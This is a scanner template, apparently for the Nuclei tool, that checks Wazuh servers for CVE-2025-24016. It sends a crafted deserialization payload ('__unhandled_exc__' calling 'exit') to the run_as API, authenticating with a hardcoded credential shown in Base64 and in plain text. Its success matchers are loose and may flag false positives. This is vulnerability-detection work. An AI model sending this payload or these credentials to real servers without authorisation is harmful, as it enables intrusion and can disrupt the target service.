id: cve-2025-24016

info:
  name: Wazuh - Unsafe Deserialization Remote Code Execution
  author: Eslam Abu Bakr @eabubakr21
  severity: critical
  description: Wazuh is a free and open source platform used for threat prevention, detection, and response. Starting in version 4.4.0 and prior to version 4.9.1, an unsafe deserialization vulnerability allows for remote code execution on Wazuh servers. DistributedAPI parameters are a serialized as JSON and deserialized using as_wazuh_object. If an attacker manages to inject an unsanitized dictionary in DAPI request/response, they can forge an unhandled exception (__unhandled_exc__) to evaluate arbitrary python code.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2025-24016
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:H/A:H
    cvss-score: 9.9
    cve-id: CVE-2025-24016
    cwe-id: CWE-502
  tags: cve,cve2025,wazuh,rce,deserialization

requests:
  # First, verify if the target is actually a Wazuh server
  - method: GET
    path:
      - "{{BaseURL}}/"

    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200 && (contains(body, "Wazuh") || contains(body, "wazuh") || contains(body, "wazuh-index") || contains(body, "wazuh-app"))'
        internal: true
        condition: and

  # If it's a Wazuh server, proceed with the vulnerability check
  - method: POST
    path:
      - "{{BaseURL}}/security/user/authenticate/run_as"

    headers:
      Content-Type: application/json
      Authorization: Basic d2F6dWgtd3VpOk15UzNjcjM3UDQ1MHIuKi0=  # Base64-encoded "wazuh-wui:MyS3cr37P450r.*-"

    body: |
      {
        "__unhandled_exc__": {
          "__class__": "exit",
          "__args__": []
        }
      }

    matchers-condition: and
    matchers:
      # Check for Wazuh-specific error messages
      - type: word
        words:
          - "Wazuh"
          - "wazuh"
        part: body
        condition: or

      # Check for Python error patterns that indicate successful exploitation
      - type: regex
        regex:
          - "(exit|SystemExit|Exception|Traceback)"
          - "(__unhandled_exc__|__class__|__args__)"
        part: body
        condition: or

      # Check for appropriate status codes
      - type: status
        status:
          - 200
          - 400
          - 500

    extractors:
      - type: regex
        regex:
          - "(exit|SystemExit|Exception|Traceback)"
        part: body
